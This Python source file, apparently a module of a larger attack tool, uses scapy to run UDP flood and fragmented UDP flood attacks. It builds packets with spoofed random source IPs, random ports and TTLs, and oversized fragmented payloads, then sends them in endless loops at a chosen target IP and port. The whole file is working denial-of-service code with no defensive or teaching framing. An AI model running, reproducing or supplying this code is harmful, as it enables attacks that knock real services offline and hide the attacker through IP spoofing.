from scapy.all import IP, UDP, send, RandIP, RandShort, fragment
from sys import path
path.append("..")
import packet_builder

def build_UDP_packet(destination_IP, destination_port, IP_spoofing=True):
    """Generate UDP packet with random source port.

    Arguments: 
    destination_IP -- the IP address of the target
    destination_port -- the targets port to which the packet will be sent
    IP_spoofing -- enable or disable source IP spoofing (default True)

    """
    if IP_spoofing:
        return IP(src=RandIP(), dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/UDP(sport=RandShort(), dport=destination_port)/packet_builder.generate_payload()

    return IP(dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/UDP(sport=RandShort(), dport=destination_port)/packet_builder.generate_payload()

def build_fragemneted_udp_packet(destination_IP, destination_port, IP_spoofing=True):
    """Generate fragmented UDP packet with random source port.

    Arguments: 
    destination_IP -- the IP address of the target
    destination_port -- the targets port to which the packet will be sent
    IP_spoofing -- enable or disable source IP spoofing (default True)

    """
    if IP_spoofing:
        return fragment(IP(src=RandIP(), dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/UDP(sport=RandShort(), dport=destination_port)/packet_builder.generate_payload(min_count=1500, max_count=65500), fragsize=packet_builder.generate_fragsize())

    return fragment(IP(dst=destination_IP, id=RandShort(), ttl=packet_builder.generate_ttl())/UDP(sport=RandShort(), dport=destination_port)/packet_builder.generate_payload(min_count=1500, max_count=65500), fragsize=packet_builder.generate_fragsize())


def start_UDP_flood(destination_IP, destination_port, IP_spoofing):
    """Continuously send UDP packets"""
    try:
        while True:
            send(build_UDP_packet(destination_IP, destination_port, IP_spoofing), inter=packet_builder.generate_delay_for_packet())   
    except KeyboardInterrupt:
        print("...Exiting...")

def start_fragmented_udp_flood(destination_IP, destination_port, IP_spoofing):
    """Continuously send fragmented UDP packets"""
    try:
        while True:
            for frag in build_fragemneted_udp_packet(destination_IP, destination_port, IP_spoofing):
                send(frag, inter=packet_builder.generate_delay_for_packet())
    except KeyboardInterrupt:
        print("...Exiting...")